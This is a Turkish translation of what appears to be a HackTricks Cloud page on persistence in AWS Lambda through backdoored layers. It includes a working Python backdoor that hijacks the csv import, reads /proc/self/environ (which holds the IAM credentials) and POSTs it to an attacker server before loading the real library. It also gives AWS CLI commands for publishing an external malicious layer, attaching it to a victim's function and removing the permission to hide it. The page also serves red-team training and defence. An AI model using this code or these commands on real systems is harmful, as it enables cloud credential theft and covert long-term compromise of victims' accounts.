# AWS - Lambda Katmanları Kalıcılığı

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin**.
* **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek hacking püf noktalarını paylaşın.

</details>
{% endhint %}

## Lambda Katmanları

Bir Lambda katmanı, **ek kod veya diğer içeriği içerebilen** bir .zip dosyası arşividir. Bir katman kütüphaneler, [özel çalışma zamanı](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-custom.html), veri veya yapılandırma dosyaları içerebilir.

Bir fonksiyona **beş katmana kadar** dahil edilebilir. Bir katmanı bir fonksiyona dahil ettiğinizde, **içerikler yürütme ortamında `/opt` dizinine çıkarılır**.

**Varsayılan olarak**, oluşturduğunuz **katmanlar** AWS hesabınıza **özeldir**. Bir katmanı diğer hesaplarla **paylaşabilir** veya katmanı **genel** yapabilirsiniz. Fonksiyonlarınız farklı bir hesabın yayınladığı bir katmanı tüketiyorsa, fonksiyonlarınız **katman sürümünü silindikten sonra veya katmana erişim izniniz iptal edildikten sonra** kullanmaya devam edebilir. Ancak silinen bir katman sürümünü kullanarak yeni bir fonksiyon oluşturamaz veya mevcut fonksiyonları güncelleyemezsiniz.

Konteyner görüntüsü olarak dağıtılan fonksiyonlar katmanları kullanmaz. Bunun yerine, tercih ettiğiniz çalışma zamanınızı, kütüphaneleri ve diğer bağımlılıkları görüntüyü oluştururken konteyner görüntüsüne paketlersiniz.

### Python yükleme yolu

Python'un lambda içinde kullanacağı yükleme yolu aşağıdaki gibidir:
```
['/var/task', '/opt/python/lib/python3.9/site-packages', '/opt/python', '/var/runtime', '/var/lang/lib/python39.zip', '/var/lang/lib/python3.9', '/var/lang/lib/python3.9/lib-dynload', '/var/lang/lib/python3.9/site-packages', '/opt/python/lib/python3.9/site-packages']
```
**Lambda katmanları** dosyalarını açtıkları dizinlerde **ikinci** ve üçüncü **pozisyonların** nasıl işgal edildiğini kontrol edin: **`/opt/python/lib/python3.9/site-packages`** ve **`/opt/python`**

{% hint style="danger" %}
Bir saldırganın kullanılan bir lambda **katmanına arka kapı eklemesi** veya **yürütülecek keyfi kod eklemesi** durumunda, her lambda çağrısında kötü amaçlı kodu yürütebilir hale gelecektir.
{% endhint %}

Bu nedenle, gereksinimler şunlardır:

* Kurban kodu tarafından **yüklendiği kontrol edilen kütüphaneler**
* Özgün kütüphaneyi **yükleyen ve özel kodu yürüten lambda katmanlarıyla bir proxy kütüphane oluşturun**.

### Önceden yüklenmiş kütüphaneler

{% hint style="warning" %}
Bu teknikten yararlanırken bir zorlukla karşılaştım: Bazı kütüphaneler, kodunuzun yürütüldüğünde python çalışma zamanında **zaten yüklenmiş** durumda. `os` veya `sys` gibi şeyler bulmayı bekliyordum, ama **hatta `json` kütüphanesinin bile yüklendiğini gördüm**.\
Bu kalıcılık tekniğinden yararlanmak için, kodun, kod yürütüldüğünde **yüklü olmayan yeni bir kütüphaneyi yüklemesi** gerekir.
{% endhint %}

Aşağıdaki gibi bir python kodu ile lambda içinde python çalışma zamanında **önceden yüklenmiş kütüphanelerin listesini** almak mümkündür:
```python
import sys

def lambda_handler(event, context):
return {
'statusCode': 200,
'body': str(sys.modules.keys())
}
```
Ve işte bu **liste** (kütüphanelerin, örneğin `os` veya `json` gibi, zaten mevcut olduğunu kontrol edin)
```
'sys', 'builtins', '_frozen_importlib', '_imp', '_thread', '_warnings', '_weakref', '_io', 'marshal', 'posix', '_frozen_importlib_external', 'time', 'zipimport', '_codecs', 'codecs', 'encodings.aliases', 'encodings', 'encodings.utf_8', '_signal', 'encodings.latin_1', '_abc', 'abc', 'io', '__main__', '_stat', 'stat', '_collections_abc', 'genericpath', 'posixpath', 'os.path', 'os', '_sitebuiltins', 'pwd', '_locale', '_bootlocale', 'site', 'types', 'enum', '_sre', 'sre_constants', 'sre_parse', 'sre_compile', '_heapq', 'heapq', 'itertools', 'keyword', '_operator', 'operator', 'reprlib', '_collections', 'collections', '_functools', 'functools', 'copyreg', 're', '_json', 'json.scanner', 'json.decoder', 'json.encoder', 'json', 'token', 'tokenize', 'linecache', 'traceback', 'warnings', '_weakrefset', 'weakref', 'collections.abc', '_string', 'string', 'threading', 'atexit', 'logging', 'awslambdaric', 'importlib._bootstrap', 'importlib._bootstrap_external', 'importlib', 'awslambdaric.lambda_context', 'http', 'email', 'email.errors', 'binascii', 'email.quoprimime', '_struct', 'struct', 'base64', 'email.base64mime', 'quopri', 'email.encoders', 'email.charset', 'email.header', 'math', '_bisect', 'bisect', '_random', '_sha512', 'random', '_socket', 'select', 'selectors', 'errno', 'array', 'socket', '_datetime', 'datetime', 'urllib', 'urllib.parse', 'locale', 'calendar', 'email._parseaddr', 'email.utils', 'email._policybase', 'email.feedparser', 'email.parser', 'uu', 'email._encoded_words', 'email.iterators', 'email.message', '_ssl', 'ssl', 'http.client', 'runtime_client', 'numbers', '_decimal', 'decimal', '__future__', 'simplejson.errors', 'simplejson.raw_json', 'simplejson.compat', 'simplejson._speedups', 'simplejson.scanner', 'simplejson.decoder', 'simplejson.encoder', 'simplejson', 'awslambdaric.lambda_runtime_exception', 'awslambdaric.lambda_runtime_marshaller', 'awslambdaric.lambda_runtime_client', 'awslambdaric.bootstrap', 'awslambdaric.__main__', 'lambda_function'
```
Ve bu, **lambda tarafından varsayılan olarak yüklenen kütüphanelerin listesi**dir: [https://gist.github.com/gene1wood/4a052f39490fae00e0c3](https://gist.github.com/gene1wood/4a052f39490fae00e0c3)

### Lambda Katmanı Geri Kapı Açma

Bu örnekte hedeflenen kodun **`csv`**'yi içe aktardığını varsayalım. **`csv` kütüphanesinin içe aktarımını geri kapılayacağız**.

Bunu yapmak için, lambda tarafından yüklenen bir yol olan **`/opt/python/lib/python3.9/site-packages`** içinde **`__init__.py`** dosyasına sahip **csv** adlı bir dizin oluşturacağız.\
Ardından, lambda çalıştırıldığında ve **csv** yüklenmeye çalışıldığında, **`__init__.py` dosyamız yüklenecek ve yürütülecektir**.\
Bu dosya şunları yapmalıdır:

* Yükümüzü yürüt
* Orijinal csv kütüphanesini yükle

Her ikisini de şu şekilde yapabiliriz:
```python
import sys
from urllib import request

with open("/proc/self/environ", "rb") as file:
url= "https://attacker13123344.com/" #Change this to your server
req = request.Request(url, data=file.read(), method="POST")
response = request.urlopen(req)

# Remove backdoor directory from path to load original library
del_path_dir = "/".join(__file__.split("/")[:-2])
sys.path.remove(del_path_dir)

# Remove backdoored loaded library from sys.modules
del sys.modules[__file__.split("/")[-2]]

# Load original library
import csv as _csv

sys.modules["csv"] = _csv
```
Sonra, bu kodu **`python/lib/python3.9/site-packages/__init__.py`** yolunda içeren bir zip dosyası oluşturun ve bir lambda katmanı olarak ekleyin.

Bu kodu [**https://github.com/carlospolop/LambdaLayerBackdoor**](https://github.com/carlospolop/LambdaLayerBackdoor) adresinde bulabilirsiniz.

Entegre edilmiş payload, **çağrıldığında IAM kimlik bilgilerini bir sunucuya İLK DEFA gönderecek veya lambda konteynerinin sıfırlanmasından SONRA** (kod değişikliği veya soğuk lambda), ancak ayrıca aşağıdaki gibi **diğer teknikler** de entegre edilebilir:

{% content-ref url="../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

### Harici Katmanlar

Dikkat edilmesi gereken nokta, **harici hesaplardan lambda katmanları kullanmanın mümkün** olduğudur. Dahası, bir lambda, izinleri olmasa bile bir harici hesaptan bir katmanı kullanabilir.\
Ayrıca **bir lambdanın sahip olabileceği maksimum katman sayısının 5** olduğunu unutmayın.

Bu nedenle, bu tekniğin esnekliğini artırmak için bir saldırgan şunları yapabilir:

* Kullanıcının mevcut bir katmanını backdoorlayabilir (hiçbir şey harici değil)
* **Kendi hesabında bir katman oluşturabilir**, **kurban hesabına katmanı kullanma izni verir**, **kurban Lambda'da katmanı yapılandırır** ve **izinleri kaldırır**.
* **Lambda** hala **katmanı kullanabilecek** ve **kurbanın** katman kodunu **indirmenin kolay bir yolu olmayacak** (lambda içinde bir ters shell almadıkça)
* Kurban, **`aws lambda list-layers`** ile kullanılan **harici katmanları görmeyecek**

{% code overflow="wrap" %}
```bash
# Upload backdoor layer
aws lambda publish-layer-version --layer-name "ExternalBackdoor" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"

# Give everyone access to the lambda layer
## Put the account number in --principal to give access only to an account
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion

## Add layer to victims Lambda

# Remove permissions
aws lambda remove-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1
```
{% endcode %}

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}
